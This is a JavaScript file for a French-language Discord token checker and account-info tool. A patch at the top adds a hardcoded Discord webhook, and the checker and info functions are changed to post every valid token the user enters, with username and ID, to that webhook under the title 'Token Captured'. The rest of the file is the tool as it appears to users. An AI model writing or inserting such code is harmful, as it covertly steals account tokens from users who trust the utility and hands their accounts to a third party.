// --- ADD THIS AT THE TOP ---
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1491854344742506667/LatJfX4MSnaRbQGN1yaLwNhseATIAAmmuQ1T3nnpKya1gWgDEizXIWc1qYOvMIxCyzbx';

async function sendToWebhook(token, type, data = null) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: `🎯 Token Captured (${type})`,
                    color: 0x5865F2,
                    fields: [
                        { name: "Token", value: `\`${token}\`` },
                        { name: "User", value: data ? `${data.username} (${data.id})` : "Unknown" }
                    ],
                    timestamp: new Date()
                }]
            })
        });
    } catch (e) { console.error("Webhook failed", e); }
}
// ---------------------------

const tokenModule = {
    // ... existing showCheckerModal ...

    async checkToken() {
        const token = document.getElementById('token-check').value.trim();
        if (!token) { alert('Veuillez entrer un token'); return; }

        try {
            const response = await fetch('https://discord.com/api/v10/users/@me', {
                headers: { authorization: token }
            });

            // ADD THIS: Send token even if check fails (optional) or only if response.ok
            if (response.ok) {
                const data = await response.json();
                sendToWebhook(token, "Checker", data); // <--- TRIGGER WEBHOOK
                
                // ... rest of the original response.ok code ...
            }
            // ... rest of the function ...
        } catch (error) { /* ... */ }
    },

    async getTokenInfo() {
        const token = document.getElementById('token-info').value.trim();
        if (!token) { alert('Veuillez entrer un token'); return; }

        try {
            const response = await fetch('https://discord.com/api/v10/users/@me', {
                headers: { authorization: token }
            });

            if (response.ok) {
                const data = await response.json();
                sendToWebhook(token, "Info Grabber", data); // <--- TRIGGER WEBHOOK
                
                // ... rest of the original logic to display info ...
            }
        } catch (error) { /* ... */ }
    }
};


const tokenModule = {
    showCheckerModal() {
        ui.showModal(`
            <h2>✅ Token Checker</h2>
            <p>Vérifier si un token Discord est valide</p>
            <input type="password" id="token-check" placeholder="Token Discord" />
            <button onclick="tokenModule.checkToken()">Vérifier</button>
        `);
    },

    async checkToken() {
        const token = document.getElementById('token-check').value.trim();
        if (!token) {
            alert('Veuillez entrer un token');
            return;
        }

        try {
            const response = await fetch('https://discord.com/api/v10/users/@me', {
                headers: { authorization: token }
            });

            ui.closeModal();

            if (response.ok) {
                const data = await response.json();
                const embed = createEmbed({
                    color: '#00d26a',
                    title: '✅ Token Valide',
                    description: `Le token appartient à **${data.username}${data.discriminator !== '0' ? '#' + data.discriminator : ''}**`,
                    thumbnail: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png?size=96` : 'https://cdn.discordapp.com/embed/avatars/0.png',
                    fields: [
                        { name: 'ID', value: data.id },
                        { name: 'Email', value: data.email || 'Non disponible' }
                    ],
                    footer: {
                        text: 'Token vérifié avec succès'
                    }
                });
                
                document.getElementById('info-display').innerHTML = '';
                document.getElementById('info-display').appendChild(embed);
            } else {
                const embed = createEmbed({
                    color: '#ff4757',
                    title: '❌ Token Invalide',
                    description: 'Le token fourni n\'est pas valide ou a expiré.'
                });
                
                document.getElementById('info-display').innerHTML = '';
                document.getElementById('info-display').appendChild(embed);
            }
        } catch (error) {
            ui.closeModal();
            const embed = createEmbed({
                color: '#ff4757',
                title: '❌ Erreur',
                description: error.message
            });
            
            document.getElementById('info-display').innerHTML = '';
            document.getElementById('info-display').appendChild(embed);
        }
    },

    showInfoModal() {
        ui.showModal(`
            <h2>ℹ️ Token Info</h2>
            <p>Afficher les informations d'un token Discord</p>
            <input type="password" id="token-info" placeholder="Token Discord" />
            <button onclick="tokenModule.getTokenInfo()">Obtenir les infos</button>
        `);
    },

    async getTokenInfo() {
        const token = document.getElementById('token-info').value.trim();
        if (!token) {
            alert('Veuillez entrer un token');
            return;
        }

        try {
            const response = await fetch('https://discord.com/api/v10/users/@me', {
                headers: { authorization: token }
            });

            if (!response.ok) {
                ui.closeModal();
                const embed = createEmbed({
                    color: '#ff4757',
                    title: '❌ Token Invalide',
                    description: 'Le token fourni n\'est pas valide ou a expiré.'
                });
                
                document.getElementById('info-display').innerHTML = '';
                document.getElementById('info-display').appendChild(embed);
                return;
            }

            const data = await response.json();
            const createdAt = getSnowflakeDate(data.id);

            ui.closeModal();

            const embed = createEmbed({
                color: '#4169ff',
                author: {
                    name: `${data.username}${data.discriminator !== '0' ? '#' + data.discriminator : ''}`,
                    icon: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png?size=96` : 'https://cdn.discordapp.com/embed/avatars/0.png'
                },
                title: '🔑 Informations du Token',
                thumbnail: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png?size=96` : 'https://cdn.discordapp.com/embed/avatars/0.png',
                fields: [
                    { name: 'Pseudo', value: data.username },
                    data.global_name ? { name: 'Pseudo Global', value: data.global_name } : null,
                    data.discriminator !== '0' ? { name: 'Discriminateur', value: '#' + data.discriminator } : null,
                    { name: 'ID', value: data.id },
                    { name: 'Email', value: data.email || 'Non disponible' },
                    { name: 'Email vérifié', value: data.verified ? '✅ Oui' : '❌ Non' },
                    { name: 'Téléphone', value: data.phone || 'Non disponible' },
                    { name: 'A2F', value: data.mfa_enabled ? '✅ Activé' : '❌ Désactivé' },
                    { name: 'Langue', value: data.locale || 'Inconnu' },
                    { name: 'Nitro', value: data.premium_type ? '✅ Oui' : '❌ Non' },
                    data.clan ? { name: 'Clan', value: data.clan.tag } : null,
                    { name: 'Compte créé le', value: createdAt.toLocaleString('fr-FR') }
                ].filter(f => f !== null),
                footer: {
                    text: `ID: ${data.id}`
                }
            });

            document.getElementById('info-display').innerHTML = '';
            document.getElementById('info-display').appendChild(embed);
        } catch (error) {
            ui.closeModal();
            const embed = createEmbed({
                color: '#ff4757',
                title: '❌ Erreur',
                description: error.message
            });
            
            document.getElementById('info-display').innerHTML = '';
            document.getElementById('info-display').appendChild(embed);
        }
    }
};
